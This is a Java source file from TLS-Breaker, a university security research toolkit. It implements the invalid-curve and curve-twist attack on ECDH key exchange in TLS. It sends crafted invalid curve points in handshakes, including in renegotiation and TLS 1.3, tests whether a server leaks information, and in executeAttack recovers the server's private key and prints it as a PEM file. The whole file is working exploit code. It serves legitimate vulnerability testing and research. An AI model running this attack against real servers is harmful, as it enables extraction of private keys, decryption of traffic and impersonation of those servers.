/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.invalidcurve.impl;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsbreaker.invalidcurve.config.InvalidCurveAttackConfig;
import de.rub.nds.tlsbreaker.invalidcurve.ec.ICEAttacker;
import de.rub.nds.tlsbreaker.invalidcurve.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsbreaker.invalidcurve.task.InvalidCurveTask;
import de.rub.nds.tlsbreaker.breakercommons.attacker.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.util.response.FingerprintSecretPair;
import de.rub.nds.tlsattacker.core.certificate.PemUtil;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.NamedGroup;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurveOverFp;
import de.rub.nds.tlsattacker.core.crypto.ec.FieldElementFp;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.core.crypto.ec.PointFormatter;
import de.rub.nds.tlsattacker.core.crypto.ec.RFC7748Curve;
import de.rub.nds.tlsattacker.core.crypto.keys.CustomECPrivateKey;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.HandshakeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.NewSessionTicketMessage;
import de.rub.nds.tlsattacker.core.protocol.message.extension.ExtensionMessage;
import de.rub.nds.tlsattacker.core.protocol.message.extension.KeyShareExtensionMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ChangeDefaultPreMasterSecretAction;
import de.rub.nds.tlsattacker.core.workflow.action.GenericReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.ResetConnectionAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.action.TlsAction;
import de.rub.nds.tlsattacker.core.workflow.action.executor.ActionOption;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.core.workflow.task.TlsTask;
import java.io.ByteArrayOutputStream;
import java.math.BigInteger;
import java.util.LinkedList;
import java.util.List;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

/**
 *
 */
public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private BigInteger premasterSecret;

    private List<FingerprintSecretPair> responsePairs;

    private List<Point> receivedEcPublicKeys;

    /**
     * All keys we received from a server in handshakes that lead to a ServerFinished - we can use these to mitigate the
     * impact of false positives in scans.
     */
    private List<Point> finishedKeys;

    private final ParallelExecutor executor;

    /**
     * Indicates if there is a higher chance that the keys we extracted might have been sent by a TLS accelerator and a
     * TLS server behind it at the same time. (See evaluateExecutedTask)
     */
    private boolean dirtyKeysWarning;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public InvalidCurveAttacker(InvalidCurveAttackConfig config, Config baseConfig) {
        super(config, baseConfig);
        executor = new ParallelExecutor(1, 3);
    }

    public InvalidCurveAttacker(InvalidCurveAttackConfig config, Config baseConfig, ParallelExecutor executor) {
        super(config, baseConfig);
        this.executor = executor;
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = getTlsConfig();

        NamedGroup invalidCurveAttackConfig_NamedGroup = config.getNamedGroup();

        tlsConfig.setDefaultSelectedNamedGroup(invalidCurveAttackConfig_NamedGroup);
        LOGGER.info("Executing attack against the server with named curve {}", invalidCurveAttackConfig_NamedGroup);
        EllipticCurve curve = CurveFactory.getCurve(invalidCurveAttackConfig_NamedGroup);

        RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
            tlsConfig.getDefaultSelectedNamedGroup());
        BigInteger result = attacker.attack();
        LOGGER.info("Resulting plain private key: {}", result);
        String privateKeyFile = generatePrivateKeyFile(result, tlsConfig);
        LOGGER.info("Resulting encoded private key:");
        LOGGER.info(privateKeyFile);
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        if (!AlgorithmResolver.getKeyExchangeAlgorithm(getTlsConfig().getDefaultSelectedCipherSuite()).isEC()) {
            LOGGER.info("The CipherSuite that should be tested is not an Ec one:"
                + getTlsConfig().getDefaultSelectedCipherSuite().name());
            return null;
        }
        responsePairs = new LinkedList<>();
        receivedEcPublicKeys = new LinkedList<>();
        finishedKeys = new LinkedList<>();
        dirtyKeysWarning = false;
        setBasePoints();

        EllipticCurve curve;
        Point point;
        if (config.isCurveTwistAttack()) {
            curve = buildTwistedCurve();
            BigInteger transformedX;
            if (config.getNamedGroup() == NamedGroup.ECDH_X25519 || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                RFC7748Curve rfcCurve = (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                Point montgPoint = rfcCurve.getPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY());
                Point weierPoint = rfcCurve.toWeierstrass(montgPoint);
                transformedX =
                    weierPoint.getFieldX().getData().multiply(config.getCurveTwistD()).mod(curve.getModulus());
            } else {
                transformedX = config.getPublicPointBaseX().multiply(config.getCurveTwistD()).mod(curve.getModulus());
            }

            point = Point.createPoint(transformedX, config.getPublicPointBaseY(), config.getNamedGroup());
        } else {
            curve = CurveFactory.getCurve(config.getNamedGroup());
            point =
                Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(), config.getNamedGroup());
        }

        int protocolFlows = getConfig().getProtocolFlows();
        if (config.getPremasterSecret() != null) {
            protocolFlows = 1;
        }

        List<TlsTask> taskList = new LinkedList<>();
        for (int i = 1; i <= protocolFlows; i++) {
            setPremasterSecret(curve, i + config.getKeyOffset(), point);
            InvalidCurveTask taskToAdd =
                new InvalidCurveTask(buildState(), executor.getReexecutions(), i + config.getKeyOffset());
            taskList.add(taskToAdd);
        }
        executor.bulkExecuteTasks(taskList);
        return evaluateExecutedTasks(taskList);
    }

    private void setBasePoints() {
        if (config.getNamedGroup() == NamedGroup.SECP160K1) {
            config.setPublicPointBaseX(new BigInteger("2E92424F6F5DCEB9445903D9790A060061B5385F", 16));
            config.setPublicPointBaseY(new BigInteger("A70CABD03A14C31A9693F2A4B0B9644E512BC671", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP160R1) {
            config.setPublicPointBaseX(new BigInteger("12352B91C125BEF7CF3F5675357130A71FA9FD09", 16));
            config.setPublicPointBaseY(new BigInteger("BBDDDABFA042D3556964D7356ACE8B1E251F3615", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP160R2) {
            config.setPublicPointBaseX(new BigInteger("343F691A0C2F9B528329D3902F0729E4F1019815", 16));
            config.setPublicPointBaseY(new BigInteger("9F7DBEB407C61B93758FCAAF0242BC7DDE5C6387", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP192K1) {
            config.setPublicPointBaseX(new BigInteger("BA64DE391455A01A0B879E42F2C5B260619ABD8807323AE6", 16));
            config.setPublicPointBaseY(new BigInteger("3C4B31082E9362EF3C4AC5D1352AFF8EDBA87A791D407A74", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP192R1) {
            config.setPublicPointBaseX(new BigInteger("6EF5DB952BE3D282A58A9CBD14F2B2CA5AE6A41205C35D5B", 16));
            config.setPublicPointBaseY(new BigInteger("9D87E2B0764AC9662426ECDF9C3EC9A00F1FF33F46989CEB", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP224K1) {
            config.setPublicPointBaseX(new BigInteger("F9345F9680736FACFA8BAC276194CE7B47EB83E53CE3D355AF190762", 16));
            config.setPublicPointBaseY(new BigInteger("DA616B66C7C6B44241FCCA14CD60BA580E074FE424CA4D7CB95445D6", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP224R1) {
            config.setPublicPointBaseX(new BigInteger("E5DEFEC40F18FDABAC7328AE1FC866D0B2C5D67CACF0241FA900143D", 16));
            config.setPublicPointBaseY(new BigInteger("E6DBC78A6F02D0C560A0CF30BA8D78CBA637180E5040B10E43382F77", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP384R1) {
            config.setPublicPointBaseX(new BigInteger(
                "95013D50D4EB8165EBDCC5B6712490674FB152885F9B9BEE43A7C6DC8D7D35A3B917F7D24CC87442D652AB988ADD462F",
                16));
            config.setPublicPointBaseY(new BigInteger(
                "98ACECC614611468E9E61A2D74928A3BA6A6854B406D5BB56A5ECE8121EC6E8938500F475C72A81110327495251314FD",
                16));
        } else if (config.getNamedGroup() == NamedGroup.SECP521R1) {
            config.setPublicPointBaseX(new BigInteger(
                "B3ED19D7DF62DCD6FF78A255B9ABECCFE1B7C79EBA3A270178463E098C003FECD530FA0EB7E2E9834332FE0FC66EB7D15174EF9134D037B8CE39BA9A9B08DE60DB",
                16));
            config.setPublicPointBaseY(new BigInteger(
                "18AA48FC63A5F6F3FC5476F92365E8C28C23E7596AB963AEAD16128D1633A4849356190BA65D373C33CED6D54B635702670D415AF34A95D291F744537953B31331B",
                16));
        } else if (config.getNamedGroup() == NamedGroup.BRAINPOOLP256R1) {
            config.setPublicPointBaseX(
                new BigInteger("A687CC3F639ED6E82427C8F6DED934688AEAA3ECE0718CA96BAC6B16771A95D8", 16));
            config.setPublicPointBaseY(
                new BigInteger("259A64D19A3050394073C5D825CED3D4E173751407BDD2FEF0B570B01EE61DAC", 16));
        } else if (config.getNamedGroup() == NamedGroup.BRAINPOOLP384R1) {
            config.setPublicPointBaseX(new BigInteger(
                "24D0DF7C9A0D59946007DCB6C44F6E57CAE92A4F54C4DDEB208F8C686E4457923E31D6CA452AB3BC9F62820358E79E21",
                16));
            config.setPublicPointBaseY(new BigInteger(
                "4FF16328A76F0906BDF0DDB7DCD927D91BC1E46375AA1B71FE86DDE722B595B9C711C36CFD5FD8F76F7E1B6AEB60AFB", 16));
        } else if (config.getNamedGroup() == NamedGroup.BRAINPOOLP512R1) {
            config.setPublicPointBaseX(new BigInteger(
                "106460CF2DB8AC1FC21CD7424F0E98A47DF2A53DEF18AC5D66C1EEC1ACC3ECB0F29A232B80AF38FAABEADE60F1DC3AE09FA166C0AB082A1756460B61391116AD",
                16));
            config.setPublicPointBaseY(new BigInteger(
                "705608F9907581783E95618DBFE50F800782E96E193CB8F2721E641BD84CB5B6F95AAFCA053B71B336B1330F0D709F91EAE3483315EB69CF4EE1FF8794EB2A82",
                16));
        }
    }

    private void setPremasterSecret(EllipticCurve curve, int i, Point point) {
        if (config.getPremasterSecret() != null) {
            premasterSecret = config.getPremasterSecret();
        } else {
            BigInteger secret = new BigInteger("" + i);
            if (config.getNamedGroup() == NamedGroup.ECDH_X25519 || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                RFC7748Curve rfcCurve = (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                secret = rfcCurve.decodeScalar(secret);
            }
            Point sharedPoint = curve.mult(secret, point);
            if (sharedPoint.getFieldX() == null) {
                premasterSecret = BigInteger.ZERO;
            } else {
                premasterSecret = sharedPoint.getFieldX().getData();
                if (config.isCurveTwistAttack()) {
                    // transform back from simulated x-only ladder
                    premasterSecret = premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus()))
                        .mod(curve.getModulus());
                    if (config.getNamedGroup() == NamedGroup.ECDH_X25519
                        || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                        // transform to Montgomery domain
                        RFC7748Curve rfcCurve = (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                        Point weierPoint = rfcCurve.getPoint(premasterSecret, sharedPoint.getFieldY().getData());
                        Point montPoint = rfcCurve.toMontgomery(weierPoint);
                        premasterSecret = montPoint.getFieldX().getData();
                    }
                }
                if (config.getNamedGroup() == NamedGroup.ECDH_X25519
                    || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                    // apply RFC7748 encoding
                    RFC7748Curve rfcCurve = (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                    premasterSecret = new BigInteger(1, rfcCurve.encodeCoordinate(premasterSecret));
                }
            }
            LOGGER.debug("PMS for scheduled Workflow Trace with secret " + i + ": " + premasterSecret.toString());
        }
    }

    private State buildState() {
        Config tlsConfig = getTlsConfig();

        EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
        ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()),
            new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
        byte[] serialized;
        if (curve instanceof RFC7748Curve) {
            serialized = ((RFC7748Curve) curve).encodeCoordinate(basepoint.getFieldX().getData());
        } else {
            serialized =
                PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint, config.getPointCompressionFormat());
        }
        serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitPMS = BigIntegers
            .asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));

        WorkflowTrace trace;
        tlsConfig.setWorkflowExecutorShouldClose(false);

        // we're modifying the config at runtime so all parallel workflow traces
        // need unique configs
        Config individualConfig = tlsConfig.createCopy();

        if (config.isAttackInRenegotiation()) {
            trace = prepareRenegotiationTrace(serializedPublicKey, pms, explicitPMS, individualConfig);
        } else {
            trace = prepareRegularTrace(serializedPublicKey, pms, explicitPMS, individualConfig);
        }

        State state = new State(individualConfig, trace);
        return state;
    }

    private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
        byte[] explicitPMS, Config individualConfig) {
        if (individualConfig.getHighestProtocolVersion() != ProtocolVersion.TLS13) {
            individualConfig
                .setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites().get(0));
        }
        WorkflowTrace trace = new WorkflowConfigurationFactory(individualConfig)
            .createWorkflowTrace(WorkflowTraceType.HELLO, RunningModeType.CLIENT);
        if (individualConfig.getHighestProtocolVersion().isTLS13()) {

            // replace specific receive action with generic
            trace.removeTlsAction(trace.getTlsActions().size() - 1);
            trace.addTlsAction(new GenericReceiveAction());

            ClientHelloMessage clientHello =
                (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(HandshakeMessageType.CLIENT_HELLO, trace);
            KeyShareExtensionMessage ksExt;
            for (ExtensionMessage ext : clientHello.getExtensions()) {
                if (ext instanceof KeyShareExtensionMessage) {
                    ksExt = (KeyShareExtensionMessage) ext;
                    // we use exactly one key share
                    ksExt.getKeyShareList().get(0).setPublicKey(serializedPublicKey);
                }
            }

            // TODO: use action / modification to influence key derivation for
            // TLS 1.3
            individualConfig.setDefaultPreMasterSecret(explicitPMS);
        } else {
            trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(individualConfig),
                new ChangeCipherSpecMessage(individualConfig), new FinishedMessage(individualConfig)));
            trace.addTlsAction(new GenericReceiveAction());

            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
                .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.setPublicKey(serializedPublicKey);
            message.prepareComputations();
            message.getComputations().setPremasterSecret(pms);
        }

        return trace;
    }

    private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
        byte[] explicitPMS, Config individualConfig) {
        WorkflowTrace trace;
        if (individualConfig.getHighestProtocolVersion().isTLS13()) {
            trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
                RunningModeType.CLIENT);
            trace.addTlsAction(new ReceiveAction(ActionOption.CHECK_ONLY_EXPECTED, new NewSessionTicketMessage(false)));
            trace.addTlsAction(new ResetConnectionAction());

            // make sure no explicit PreMasterSecret is set upon execution
            ChangeDefaultPreMasterSecretAction noPMS = new ChangeDefaultPreMasterSecretAction();
            noPMS.setNewValue(new byte[0]);
            trace.getTlsActions().add(0, noPMS);

            // next ClientHello needs a PSKExtension
            individualConfig.setAddPreSharedKeyExtension(Boolean.TRUE);

            WorkflowTrace secondHandshake =
                prepareRegularTrace(serializedPublicKey, pms, explicitPMS, individualConfig);

            // subsequent ClientHellos don't need a PSKExtension
            individualConfig.setAddPreSharedKeyExtension(Boolean.FALSE);

            // set explicit PreMasterSecret later on using an action
            ChangeDefaultPreMasterSecretAction clientPMS = new ChangeDefaultPreMasterSecretAction();
            clientPMS.setNewValue(explicitPMS);
            trace.addTlsAction(clientPMS);

            for (TlsAction action : secondHandshake.getTlsActions()) {
                trace.addTlsAction(action);
            }
        } else {
            individualConfig
                .setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites().get(0));
            trace = new WorkflowConfigurationFactory(individualConfig)
                .createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION, RunningModeType.CLIENT);
            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
                .getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.setPublicKey(serializedPublicKey);
            message.prepareComputations();
            message.getComputations().setPremasterSecret(pms);

            // replace specific receive action with generic
            trace.removeTlsAction(trace.getTlsActions().size() - 1);
            trace.addTlsAction(new GenericReceiveAction());
        }

        return trace;
    }

    /**
     * @return the receivedEcPublicKeys
     */
    public List<Point> getReceivedEcPublicKeys() {
        return receivedEcPublicKeys;
    }

    private EllipticCurveOverFp buildTwistedCurve() {
        EllipticCurveOverFp intendedCurve;
        if (config.getNamedGroup() == NamedGroup.ECDH_X25519 || config.getNamedGroup() == NamedGroup.ECDH_X448) {
            intendedCurve = ((RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup())).getWeierstrassEquivalent();
        } else {
            intendedCurve = (EllipticCurveOverFp) CurveFactory.getCurve(config.getNamedGroup());
        }
        BigInteger modA = intendedCurve.getFieldA().getData().multiply(config.getCurveTwistD().pow(2))
            .mod(intendedCurve.getModulus());
        BigInteger modB = intendedCurve.getFieldB().getData().multiply(config.getCurveTwistD().pow(3))
            .mod(intendedCurve.getModulus());
        EllipticCurveOverFp twistedCurve = new EllipticCurveOverFp(modA, modB, intendedCurve.getModulus());
        config.setTwistedCurve(twistedCurve);
        return twistedCurve;
    }

    private Boolean evaluateExecutedTasks(List<TlsTask> taskList) {
        boolean foundExecutedAsPlanned = false;
        boolean foundServerFinished = false;

        boolean tookKeyFromSuccessfulTrace = false;
        boolean tookKeyFromUnsuccessfulTrace = false;
        for (TlsTask tlsTask : taskList) {
            InvalidCurveTask task = (InvalidCurveTask) tlsTask;
            WorkflowTrace trace = task.getState().getWorkflowTrace();
            if (!task.isHasError()) {
                foundExecutedAsPlanned = true;
                if (!(WorkflowTraceUtil.getLastReceivedMessage(trace) != null
                    && WorkflowTraceUtil.getLastReceivedMessage(trace) instanceof HandshakeMessage
                    && ((HandshakeMessage) WorkflowTraceUtil.getLastReceivedMessage(trace)).getHandshakeMessageType()
                        == HandshakeMessageType.FINISHED)) {
                    LOGGER.info("Received no finished Message using secret" + task.getAppliedSecret());
                } else {
                    LOGGER.info("Received a finished Message using secret: " + task.getAppliedSecret()
                        + "! Server is vulnerable!");
                    finishedKeys.add(task.getReceivedEcKey());
                    foundServerFinished = true;
                }

                if (task.getReceivedEcKey() != null) {
                    tookKeyFromSuccessfulTrace = true;
                    getReceivedEcPublicKeys().add(task.getReceivedEcKey());
                }
            } else {
                if (task.getReceivedEcKey() != null) {
                    tookKeyFromUnsuccessfulTrace = true;
                    getReceivedEcPublicKeys().add(task.getReceivedEcKey());
                }
            }
            responsePairs.add(new FingerprintSecretPair(task.getFingerprint(), task.getAppliedSecret()));
        }

        if (config.isAttackInRenegotiation() && tookKeyFromSuccessfulTrace && tookKeyFromUnsuccessfulTrace) {
            /*
             * keys from an unsuccessful trace might have been extracted from the first handshake of a renegotiation
             * workflow trace - it could* be more probable that this is not the same TLS server as the server, which
             * answered the 2nd handshake while we can't ensure that were talking to the same TLS server all the time
             * anyway, it is more important to keep an eye on this case since we're running attacks in renegotiation
             * because we assume that we can bypass a TLS accelerator like this
             */
            dirtyKeysWarning = true;
        }

        if (foundExecutedAsPlanned) {
            if (foundServerFinished) {
                return true;
            } else {
                return false;
            }
        } else {
            return null;
        }
    }

    private String generatePrivateKeyFile(BigInteger result, Config tlsConfig) {
        CustomECPrivateKey key = new CustomECPrivateKey(result, tlsConfig.getDefaultSelectedNamedGroup());
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        PemUtil.writePrivateKey(key, baos);
        return new String(baos.toByteArray());
    }

    /**
     * @return the responsePairs
     */
    public List<FingerprintSecretPair> getResponsePairs() {
        return responsePairs;
    }

    /**
     * @param responsePairs
     *                      the responsePairs to set
     */
    public void setResponsePairs(List<FingerprintSecretPair> responsePairs) {
        this.responsePairs = responsePairs;
    }

    /**
     * @return the dirtyKeysWarning
     */
    public boolean isDirtyKeysWarning() {
        return dirtyKeysWarning;
    }

    /**
     * @return the finishedKeys
     */
    public List<Point> getFinishedKeys() {
        return finishedKeys;
    }
}
